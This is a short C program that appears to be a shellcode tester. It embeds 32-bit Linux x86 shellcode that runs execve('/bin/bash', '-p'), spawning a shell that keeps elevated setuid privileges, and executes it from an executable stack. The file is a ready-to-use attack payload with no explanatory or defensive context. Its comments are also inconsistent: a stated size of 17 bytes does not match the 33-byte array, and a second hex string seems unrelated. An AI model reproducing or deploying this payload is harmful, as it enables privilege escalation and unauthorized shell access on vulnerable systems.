#include <stdio.h>
#include <string.h>

// -z execstack

// \x55\x48\x89\xe5\x48\x8d\x3d\x9f\xe8\xc6\xfe\xff\xff\xb8\x5d\xc4\x66\x2e\x0f\x1f\x84\x0f\x1f\x44

// opcode size 17

char code[]= "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";

int main()
{

    printf("Shellcode Length: %d\n", strlen(code));

    int (*ret)() = (int(*)())code;

    ret();
}
